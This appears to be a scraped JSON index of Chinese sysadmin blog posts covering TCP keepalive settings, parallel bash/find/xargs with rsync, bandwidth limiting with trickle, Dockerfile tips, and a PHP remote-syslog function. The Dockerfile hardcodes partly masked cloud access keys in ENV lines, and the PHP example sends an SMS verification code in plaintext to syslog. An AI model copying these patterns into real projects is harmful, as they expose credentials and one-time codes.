秒\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tcp_keepalive_probes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e缺省是 9\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tcp_keepalive_intvl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e缺省是 75 秒\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e处理流程如下：\u003c/p\u003e\n\u003cp\u003e一、客户端打开一个 TCP socket 连接，开始跟服务器通讯\u003c/p\u003e\n\u003cp\u003e二、如果这条 socket 连接空闲没有任何数据传输，静默了 \u003ccode\u003etcp_keepalive_time\u003c/code\u003e 秒后，那么客户端会主动发送一个空的 \u003ccode\u003eACK\u003c/code\u003e 包到服务器\u003c/p\u003e\n\u003cp\u003e三、那么，根据服务器是否回应了一个相应的 ACK 包来判断\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eACK    \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e未回应\n\u003col\u003e\n\u003cli\u003e等待 \u003ccode\u003etcp_keepalive_intvl\u003c/code\u003e 秒，然后再发一个 \u003ccode\u003eACK\u003c/code\u003e 包\u003c/li\u003e\n\u003cli\u003e重复以上等待并发送 ACK 包的过程，直到次数等于 \u003ccode\u003etcp_keepalive_probes\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e如果第2步做完还收不到任何回应，发送一个 \u003ccode\u003eRST\u003c/code\u003e 包并关闭连接\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e回应了\u003c/strong\u003e: 回到上述第二步\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e那么缺省情况下，7200+75×9，一个没有任何数据传输的 socket 才会被关闭，大概是2小时11分钟。\u003c/p\u003e","title":"Linux内核TCP连接Keep-Alive timeout的配置"},{"content":"这属于Shell的高级技巧了，我们可能需要在 bash 中并发 wget rsync 文件，下面就讨论一下这个问题。\n首先从简单的单线程开始：\n$ for i in $(seq 1 2); do echo $i; done 1 2 可以看到是顺序执行的，下面变多线程：\n$ for i in $(seq 1 2); do echo $i \u0026amp; done [1] 245505 1 [2] 245506 2 [1] Done echo $i [2] Done echo $i 可以看到我们只把 ; 号改成了 \u0026amp; 号，程序就变成了多线程执行。\n区别在于 ; 号会等待之前的命令执行完毕再执行下一条，而 \u0026amp; 不等待，直接继续执行下一条；相当于后台运行了前一条命令。\n下面说说 find 的单线程和多线程：\nfind 的 exec 用法\n$ find /path [args] -exec [cmd] {} \\; {} 占位符号，存放find找到的记录 ; 对于每一条找到的单独记录，执行的cmd是一条一条单独执行的 执行的顺序如下: cmd result1; cmd result2; \u0026hellip;; cmd result N $ find /path [args] -exec [cmd] {} \\+ {} 占位符号，存放find找到的记录 + 对于找到的所有记录，执行的cmd是合并了所有记录集执行的 执行顺序如下: cmd result1 result2 \u0026hellip; result N 多个exec可以串起来：\n$ find /tmp/dir1/ -type f -exec grep howtouselinux {} \\; -exec echo {} \\; | sed \u0026#39;s/howtouselinux/deep/g\u0026#39; 至此，find 也还是单线程执行的，并没有并发。\nfind 要并发，就只能跟 xargs 结合在一起：\nxargs 通常配合管道使用，将前面命令产生的参数，逐个传入后续命令，作为参数。xargs 传来的参数，默认位于 xargs 后面命令的最后，如果要改变位置，需要用**-I**参数。xargs 如果不带命令，缺省是 echo\n-d 分隔符\n$ echo -e \u0026#34;a\\tb\\tc\u0026#34; | xargs -d \u0026#34;\\t\u0026#34; echo a b c -I{} 指定占位符，-I %那就是 % 替代从之前管道取得的参数\n$ find . -type d | xargs -I % -0 rsync -auvPR % 192.168.1.38::new/ -0 跟find的-print0配合，find命令有一个特别的参数-print0，指定输出的文件列表以null分隔。然后，xargs命令的-0参数表示用null当作分隔符。\n$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -I % -0 rsync -auvPR % 172.18.34.38::new/ -P 最大并发线程数，下面是并发30线程\n$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -I % -0 rsync -auvPR % 172.18.34.38::new/ -n 选项限制单个命令行的参数个数，下面是 rsync 一行命令传带60个文件，30个进程那就是30个 rsync，每个 rsync 同时传60个文件。\n$ find ./new -mindepth 6 -maxdepth 6 -type d -print0 | xargs -P 30 -n 60 -I % -0 rsync -auvPR % 172.18.34.38::new/ $ echo {0..10} | xargs -I{} -n 2 0 1 2 3 4 5 6 7 8 9 10 使用 bash -c 并发的例子：\n$ time for i in $(seq 1 5); do echo $[$RANDOM % 5 + 1]; done | xargs -I{} echo \u0026#34;sleep {}; echo \u0026#39;Done! {}\u0026#39;\u0026#34; | xargs -P5 -I{} bash -c \u0026#34;{}\u0026#34; ","permalink":"https://rendoumi.com/posts/20211029-bash_multithread/","summary":"\u003cp\u003e这属于Shell的高级技巧了，我们可能需要在 bash 中并发 wget rsync 文件，下面就讨论一下这个问题。\u003c/p\u003e\n\u003cp\u003e首先从简单的单线程开始：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"k\"\u003e$(\u003c/span\u003eseq \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到是顺序执行的，下面变多线程：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ \u003cspan class=\"k\"\u003efor\u003c/span\u003e i in \u003cspan class=\"k\"\u003e$(\u003c/span\u003eseq \u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"m\"\u003e245505\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e2\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"m\"\u003e245506\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e   Done                    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e2\u003cspan class=\"o\"\u003e]\u003c/span\u003e   Done                    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到我们只把 ; 号改成了 \u0026amp; 号，程序就变成了多线程执行。\u003c/p\u003e\n\u003cp\u003e区别在于 ; 号会等待之前的命令执行完毕再执行下一条，而 \u0026amp; 不等待，直接继续执行下一条；相当于后台运行了前一条命令。\u003c/p\u003e\n\u003cp\u003e下面说说 find 的单线程和多线程：\u003c/p\u003e\n\u003cp\u003efind 的 exec 用法\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ find /path \u003cspan class=\"o\"\u003e[\u003c/span\u003eargs\u003cspan class=\"o\"\u003e]\u003c/span\u003e -exec \u003cspan class=\"o\"\u003e[\u003c/span\u003ecmd\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e{} 占位符号，存放find找到的记录\u003c/li\u003e\n\u003cli\u003e; 对于每一条找到的单独记录，执行的cmd是一条一条单独执行的\u003c/li\u003e\n\u003cli\u003e执行的顺序如下: cmd result1; cmd result2; \u0026hellip;; cmd result N\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ find /path \u003cspan class=\"o\"\u003e[\u003c/span\u003eargs\u003cspan class=\"o\"\u003e]\u003c/span\u003e -exec \u003cspan class=\"o\"\u003e[\u003c/span\u003ecmd\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e \u003cspan class=\"se\"\u003e\\+\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e{} 占位符号，存放find找到的记录\u003c/li\u003e\n\u003cli\u003e+  对于找到的所有记录，执行的cmd是合并了所有记录集执行的\u003c/li\u003e\n\u003cli\u003e执行顺序如下: cmd result1 result2 \u0026hellip; result N\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e多个exec可以串起来：\u003c/p\u003e","title":"shell以及find的多线程执行"},{"content":"之前讲过如何对 opnvpn 总体限速，这次来了一个更严格的程序限速需求：\n场景如下：\n两个机房间有一条专线 100M\n两个机房间需要同步数据，同步需要限制到60M，给别的程序留出带宽空间\n传输是多个文件，用 rsync 并发传送\n分析了一下脚本的核心部分\nfind . -type f | grep $(date -d\u0026#34;-1 day\u0026#34; +\u0026#39;%Y%m%d\u0026#39;) |xargs -I % -P 30 rsync -auvPR % 192.168.9.17::mysql 发现是利用 xargs 的并发，-P 30 最大并发30个，启动了 rsync 同步\nrsync 没有限速，这就麻烦了。\n一、单文件单独限速 首先是使用 rsync 的 \u0026ndash;bwlimit=600 参数，把速度限制为 600KB/s ，600×8=4800，单进程基本是5M的速度，最多只能跑12个了，就会跑到60M。\n这样也不太对，尤其是 rsync 并发进程逐渐减少，少于12个的时候，这样就出现跑不满60M的现象。\n二、多文件整体限速 那么 rsync 支持多文件传输 ，使用如下格式整体限速\nrsync --bwlimit=7200 -auvPR 文件1 文件2 文件3 192.168.9.17::mysql 问题又来了，文件1 文件2 文件3 的路径非常长，而文件个数不定，有撑爆命令行单行长度限制的可能，也不可行\n三、tc 使用 tc 可以控制源ip或者目的ip的带宽，但是本机网卡是万兆光卡，生产环境，每时每刻都有数据读写。\n一旦错了，就直接完蛋了。也不太可行\n四、杀器trickle 寻找了半天，终于找到了个大杀器trickle，可以对程序单独限速，也可以对一堆程序整体限速\n安装：\n$ yum install -y epel-release $ yum install trickle 参数解释：\n-u 上载速度 KB/s ，乘以8换算成网络速度 -d 下载速度 KB/s ，乘以8换算成网络速度 -s standalone独立模式，不参与 trickled 的整体模式 如果要对一个程序单独限速，10KB\ntrickle -s -u 10 -d 10 wget http://mirrors.163.com/rocky/8/isos/x86_64/Rocky-8.4-x86_64-dvd1.iso wget 的下载完全被限制在了10KB\n如过要对使用trickle的所有程序做整体限速\n# 首先启动守护进程 trickled $ trickled -u 7200 -d 7200 # 然后所有用trickle执行的命令就会整理限速在7200KB/s （网络速度60M） find . -type f | grep $(date -d\u0026#34;-1 day\u0026#34; +\u0026#39;%Y%m%d\u0026#39;) |xargs -I % -P 30 trickle rsync -auvPR % 192.168.9.17::mysql ","permalink":"https://rendoumi.com/posts/20211028-trickle/","summary":"\u003cp\u003e之前讲过如何对 opnvpn 总体限速，这次来了一个更严格的程序限速需求：\u003c/p\u003e\n\u003cp\u003e场景如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e两个机房间有一条专线 100M\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e两个机房间需要同步数据，同步需要限制到60M，给别的程序留出带宽空间\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e传输是多个文件，用 rsync 并发传送\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e分析了一下脚本的核心部分\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind . -type f  \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"k\"\u003e$(\u003c/span\u003edate -d\u003cspan class=\"s2\"\u003e\u0026#34;-1 day\u0026#34;\u003c/span\u003e +\u003cspan class=\"s1\"\u003e\u0026#39;%Y%m%d\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003exargs -I % -P \u003cspan class=\"m\"\u003e30\u003c/span\u003e rsync -auvPR % 192.168.9.17::mysql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e发现是利用 xargs 的并发，-P 30 最大并发30个，启动了 rsync 同步\u003c/p\u003e\n\u003cp\u003ersync 没有限速，这就麻烦了。\u003c/p\u003e\n\u003ch2 id=\"一单文件单独限速\"\u003e一、单文件单独限速\u003c/h2\u003e\n\u003cp\u003e首先是使用 rsync 的 \u0026ndash;bwlimit=600 参数，把速度限制为 600KB/s ，600×8=4800，单进程基本是5M的速度，最多只能跑12个了，就会跑到60M。\u003c/p\u003e\n\u003cp\u003e这样也不太对，尤其是 rsync 并发进程逐渐减少，少于12个的时候，这样就出现跑不满60M的现象。\u003c/p\u003e\n\u003ch2 id=\"二多文件整体限速\"\u003e二、多文件整体限速\u003c/h2\u003e\n\u003cp\u003e那么 rsync 支持多文件传输 ，使用如下格式整体限速\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync --bwlimit\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e7200\u003c/span\u003e -auvPR 文件1 文件2 文件3 192.168.9.17::mysql \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e问题又来了，文件1 文件2 文件3 的路径非常长，而文件个数不定，有撑爆命令行单行长度限制的可能，也不可行\u003c/p\u003e\n\u003ch2 id=\"三tc\"\u003e三、tc\u003c/h2\u003e\n\u003cp\u003e使用 tc 可以控制源ip或者目的ip的带宽，但是本机网卡是万兆光卡，生产环境，每时每刻都有数据读写。\u003c/p\u003e\n\u003cp\u003e一旦错了，就直接完蛋了。也不太可行\u003c/p\u003e\n\u003ch2 id=\"四杀器trickle\"\u003e四、杀器trickle\u003c/h2\u003e\n\u003cp\u003e寻找了半天，终于找到了个大杀器trickle，可以对程序单独限速，也可以对一堆程序整体限速\u003c/p\u003e\n\u003cp\u003e安装：\u003c/p\u003e","title":"Linux下的程序限速软件Trickle"},{"content":"Dockerfile 是造出镜像的基础，是必须熟知并了解的知识：\n一、编写Dockerfile 先给个例子，是 minio 代理访问阿里的 OSS\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z ENV MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb ENV MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y WORKDIR /data EXPOSE 9000 CMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] # CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; 详细解释每一条语句：\nFROM\n基板，alpine 3.12 是个比较微小的版本，注意它的毛病，/bin/sh其实是busybox，没有/bin/bash，某些bash的函数功能支持不全，比如for循环\nRUN\n在容器中运行命令，上例中我们添加了 bash ，并清理了缓存。命令间用 \u0026amp;\u0026amp; 可以避免镜像过多分层。\nRUN分两种模式shell和exec模式:\n我们只用 exec 模式，因为在 image 里装入多个 shell，没什么意义。\nCOPY 和 ADD\n作用都是将文件或目录复制到 Dockerfile 构建的镜像中\n我们只用COPY，如果遇到要把URL的文件放进去，可以先wget，然后放；如果要解压tarr包放进去，那就先解压再放。\n注意源文件路径都使用相对路径，目标路径使用绝对路径。\n如果dest不指定绝对路径，则是想对于WORDIR的相对路径\nCMD 入口\n用 [] 分割， 把所有 \u0026quot;\u0026quot; 的部分合并为一行，中间用空格隔开执行；或者直接一行没任何分割符。\n所以上面的例子就是执行了一句：\n/data/minio.RELEASE.2020-04-15T19-42-18Z gateway oss http://oss-cn-shanghai-internal.aliyuncs.com 技巧：\n把几个命令合在一起执行\n()表示在当前shell合并执行\n{}表示派生出一个子shell，在子shell中合并执行，{ echo \u0026ldquo;aaa\u0026rdquo; }必须有空格\n\u0026amp;表示后台运行\n命令之间使用 \u0026amp;\u0026amp; 连接，实现逻辑与的功能。\n只有在 \u0026amp;\u0026amp; 左边的命令返回真（命令返回值 $? == 0），\u0026amp;\u0026amp; 右边的命令才会被执行。 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。 \u0026amp;\u0026amp;左边的命令（命令1）返回真(即返回0，成功被执行）后，\u0026amp;\u0026amp;右边的命令（命令2）才能够被执行；换句话说，“如果这个命令执行成功\u0026amp;\u0026amp;那么执行第二个命令”。\n最下的语法用了seq而不是for循环，是因为busybox的sh不支持for语法\n所以才有如此怪异的语法，在容器中后台跑10个php think queue，1个crond，前台跑一个php-fpm：\nCMD for i in $(seq 10); do (php think queue \u0026amp;) ; done \u0026amp; crond \u0026amp;\u0026amp; php-fpm ARG 参数\nARG VERSION=7.6.1\n定义后可以用${VERSION}引用，build的时候可以加\u0026ndash;build-arg 传参数进去\ndocker build --build-arg VERSION=${LATEST} -t $(ORG)/$(NAME):$(BUILD) . 还有很多 Build 的技巧，如果造一个 go 语言编译环境的中间层镜像，然后造最终镜像。\n但是八戒还是推荐直接造出二进制可执行文件，然后直接拷贝进去就好，不要弄的过于麻烦，中间层那种适用于用源码 CI/CD 中无编译环境的情况。\n二、调试容器 很多情况下我们造好了 image ，一跑就掉下来了，也不知道是什么情况\n这个时候，我们把 CMD 换成一个 sh 执行一个死循环\nCMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; 然后进入容器，然后再执行之前的 CMD 命令，看看报错信息是什么，就可以调试了\n$ docker exec -it 89174asklja /bin/sh 三、pod的等待技巧 这里启动正式的pod之前，先临时起了两个容器等待其他服务的完成\ncontainers: - name: myapp-container image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo The app is running! \u0026amp;\u0026amp; sleep 3600\u0026#39;] initContainers: - name: init-myservice image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup myservice; do echo waiting for myservice; sleep 2; done;\u0026#39;] - name: init-mydb image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup mydb; do echo waiting for mydb; sleep 2; done;\u0026#39;] ","permalink":"https://rendoumi.com/posts/20211028-dockerfile/","summary":"\u003cp\u003eDockerfile 是造出镜像的基础，是必须熟知并了解的知识：\u003c/p\u003e\n\u003ch2 id=\"一编写dockerfile\"\u003e一、编写Dockerfile\u003c/h2\u003e\n\u003cp\u003e先给个例子，是 minio 代理访问阿里的 OSS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/*  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_ACCESS_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eLTAI5tFFTbsxxxxxuLb  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_SECRET_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003et78PyGnHZilxxxxxdxBCjvNgtVC5Y  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /data  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 9000  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cp\u003e详细解释每一条语句：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eFROM\u003c/p\u003e\n\u003cp\u003e基板，alpine 3.12 是个比较微小的版本，注意它的毛病，/bin/sh其实是busybox，没有/bin/bash，某些bash的函数功能支持不全，比如for循环\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRUN\u003c/p\u003e\n\u003cp\u003e在容器中运行命令，上例中我们添加了 bash ，并清理了缓存。命令间用 \u0026amp;\u0026amp; 可以避免镜像过多分层。\u003c/p\u003e\n\u003cp\u003eRUN分两种模式shell和exec模式:\u003c/p\u003e\n\u003cp\u003e我们只用 exec 模式，因为在 image 里装入多个 shell，没什么意义。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCOPY 和 ADD\u003c/p\u003e","title":"Dockerfile的编写与调试技巧"},{"content":"给同事做了个 PHP 接口，转发发送短信的请求，同时要把发送记录发送到远程的 cacti 的 syslog 去\n很简单，但是也不简单\n首先是 PHP 服务器，是最简化编译的，php -m 查了一下\nphp -m [PHP Modules] Core ctype curl date dom fileinfo filter gettext hash iconv json libxml openssl pcre PDO pdo_sqlite Phar posix Reflection session SimpleXML SPL sqlite3 standard tokenizer xml xmlreader xmlwriter [Zend Modules] 居然没有 socket 模块，没办法，找到源代码，编译一个安装，原有的 php 安装路径是 /export/servers/php\n$ tar zxvf php-7.4.0.tar.gz $ cd php-7.4.0/sockets $ /export/servers/php/bin/phpize $ ./configure --enable-sockets --with-php-config=/export/servers/php/bin/php-config $ make $ make install 又看了一眼，是 php-fpm，居然没有 php.ini ，得，再生成一个，放在 /export/servers/php/lib/php.ini\nextension_dir = \u0026#34;/export/servers/php740/lib/php/extensions/no-debug-non-zts-20190902/\u0026#34; extension = sockets.so 然后重启 php-fpm ，重新 php -m 检查，发现有 socket 模块就 ok 了。\n接下来就是 php 源代码了\n\u0026lt;?php date_default_timezone_set(\u0026#39;Asia/Shanghai\u0026#39;); function send_remote_syslog($message) { $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); foreach(explode(\u0026#34;\\n\u0026#34;, $message) as $line) { $syslog_message = \u0026#34;\u0026lt;22\u0026gt;\u0026#34; . date(\u0026#39;M d H:i:s \u0026#39;) . \u0026#39;Qi_an_xin sms_log: \u0026#39; . $line; socket_sendto($sock, $syslog_message, strlen($syslog_message), 0, \u0026#39;172.18.31.6\u0026#39;, 514); } socket_close($sock); } send_remote_syslog(\u0026#34;ABC 验证码: 39792192\u0026#34;); ?\u0026gt; 这样就可以了，上面代码比较难理解的是\u0026lt;22\u0026gt;，那是报错级别的计算方法，Facility + Severity：\n* Facility values: * 0 kernel messages * 1 user-level messages * 2 mail system * 3 system daemons * 4 security/authorization messages * 5 messages generated internally by syslogd * 6 line printer subsystem * 7 network news subsystem * 8 UUCP subsystem * 9 clock daemon * 10 security/authorization messages * 11 FTP daemon * 12 NTP subsystem * 13 log audit * 14 log alert * 15 clock daemon * 16 local user 0 (local0) (default value) * 17 local user 1 (local1) * 18 local user 2 (local2) * 19 local user 3 (local3) * 20 local user 4 (local4) * 21 local user 5 (local5) * 22 local user 6 (local6) * 23 local user 7 (local7) * * Severity values: * 0 Emergency: system is unusable * 1 Alert: action must be taken immediately * 2 Critical: critical conditions * 3 Error: error conditions * 4 Warning: warning conditions * 5 Notice: normal but significant condition (default value) * 6 Informational: informational messages * 